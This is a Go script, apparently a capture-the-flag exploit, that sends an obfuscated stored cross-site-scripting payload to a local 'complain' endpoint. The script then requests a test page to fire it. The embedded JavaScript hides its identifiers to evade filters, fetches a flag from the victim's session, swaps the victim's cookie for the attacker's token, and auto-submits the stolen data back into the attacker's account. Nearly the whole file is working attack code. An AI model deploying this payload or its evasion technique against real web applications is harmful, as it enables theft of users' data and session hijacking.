package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"time"
)

func sendPostRequestWithCookie(url, postData, cookie string) {
	// Membuat request HTTP POST
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(fmt.Sprintf(`{"complain":"%s"}`,postData))))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	// Mengatur tipe konten untuk permintaan
	req.Header.Set("Content-Type", "application/json")

	jar, err := cookiejar.New(nil)
	if err != nil { 
		panic(err)
	}


	// Mengatur cookie dalam header permintaan
	// req.Header.Set("Cookie", cookie)

	// Membuat klien HTTP
	client := &http.Client{
		Jar: jar,
	}
	cookieJar := &http.Cookie{
        Name:  "cook-token",
        Value: cookie,
    }
	req.AddCookie(cookieJar)

	// Melakukan permintaan HTTP
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	// Membaca respons dari server
	body := make([]byte, 1024)
	_, err = resp.Body.Read(body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	fmt.Println("Response:", string(body))
}
func sendGetRequestWithCookie(url, cookie string) {
	// Membuat request HTTP GET
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	jar, err := cookiejar.New(nil)
	if err != nil { 
		panic(err)
	}
	
	// Membuat klien HTTP
	client := &http.Client{
		Jar: jar,
	}
	cookieJar := &http.Cookie{
        Name:  "cook-token",
        Value: cookie,
    }
	req.AddCookie(cookieJar)

		// Send the HTTP request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	fmt.Println("Response:", string(body))
}
func main(){
	url := "http://localhost:21204/complain"
	cookie := "6cf9c754-a616-4b77-a11d-154595040a0d"
	postData1 := fmt.Sprintf("<script>q=([]+/1/)[0];s=(d)=>{j=[]+[];d=j+d;for(x in d){if(d[x]!=q){j+=d[x]}}return j};c=s(/complain/);z=s(/submit/);f=self[s(/fe/)+s(/tch/)];t=s(/then/);l=s(/appendChild/);n=s(/createElement/);D=self[s(/document/)];v=s(/value/);f(q+s(/getFlag/))[t](e=>e[s(/text/)]())[t](e=>{D[s(/cookie/)]=s(/cook-token=%s/);o=D[n](s(/form/));o[s(/method/)]=s(/post/);o[s(/action/)]=q+c;a=D[n](s(/input/));a[s(/name/)]=c;a[v]=e;u=D[n](s(/input/));u[s(/type/)]=z;u[v]=z;o[l](a);o[l](u);D[s(/body/)][l](o);o[z]()})</script>", cookie)

	sendPostRequestWithCookie(url, postData1, cookie)
	// sendPostRequestWithCookie(url, postData2, cookie)
	time.Sleep(5*time.Second)
	sendGetRequestWithCookie("http://localhost:21204/complain/test",cookie)
}